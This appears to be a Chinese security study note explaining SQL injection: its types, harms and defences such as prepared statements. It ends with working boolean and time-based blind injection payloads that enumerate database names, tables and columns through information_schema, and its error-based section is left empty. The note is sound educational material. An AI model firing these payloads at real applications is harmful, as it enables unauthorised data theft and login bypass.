---
title: 0x03 注入攻击 (理论篇)
date: 2022-12-29 14:48:49
categories: 
    - 网安笔记
tags: 
    - 注入攻击
---

# 一、SQL注入攻击介绍
Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击。SQL注入是发生于应用程序与数据库层的安全漏洞。注入的漏洞本质是代码和数据未分离，通过在用户可控参数中注入SQL语法，程序未对输入的指令进行合法性判断，注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。


# 二、SQL注入分类
* 回显注入：攻击者可以直接在当前界面内容中获取想要的内容或者通过报错信息 获取想要的内容。

* 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使 数据库执行延时等方法获取想要的内容。

# 三、SQL注入危害
* 猜解后台数据库，盗取网站的敏感信息。
* 绕过认证，列如绕过验证登录网站后台。
* 注入可以借助数据库的存储过程进行提权等操作

# 四、注入攻击的预防
针对 SQL 注入漏洞的防护，主要是要意识到这种漏洞的存在，不信任任何来自客户端的数据。
可以通过过滤一些 SQL 关键字的方式进行防护，比如“select”、“insert”这一类 关键字，“`” （反引号） 、“ ””（双引号）、“--”（ SQL 注释开头）这一类保留字符等。当然因为各种编码和绕过技术，手工进行过滤是不够的，容易遗漏，比较安全的方式是采用语言 预置的功能，例如，用 Java 的 PreparedStatment 进行 SQL 操作。

当然，现在还有很多框架类的数据操作工具可以给我们帮助，常见的数据库持久化框架，都会自动完成对相关数据的过滤和校验。最后，千万不要使用字符串拼接的方式进行 SQL 语句的组装和操作。 

# 五、盲注技巧
> [盲注技巧汇总](https://www.cnblogs.com/zane-s/articles/12371820.html)

## 1. 布尔盲注

常用函数
```
mid(str,start,length)  :字符串截取
ORD()                  :转换成ascii码
Length()               :统计长度
version()              :查看数据库版本
database()             :查看当前数据库名
user()                 :查看当前用户
```

猜解获取数据库长度:
```sql
' or length(database()) > 8 --+    :符合条件返回正确，反之返回错误
```

猜解数据库名:
```sql
'or mid(database(),1,1)= 'z'
```

猜解表名
```sql
'Or mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = 'a'
```

猜解字段名
```sql
' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1)
```

## 2. 延迟盲注
常用函数
```
Sleep()                           :延迟函数
If(condition,true,false)          :条件语句
mid(str,start,length)             :字符串截取
ORD()                             :转换成ascii码
Length()                          :统计长度
version()                         :查看数据库版本
database()                        :查看当前数据库名
user()                            :查看当前用户
```

猜解数据库总数
```sql
' and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)= 7,0,5))
```

## 3. 报错盲注




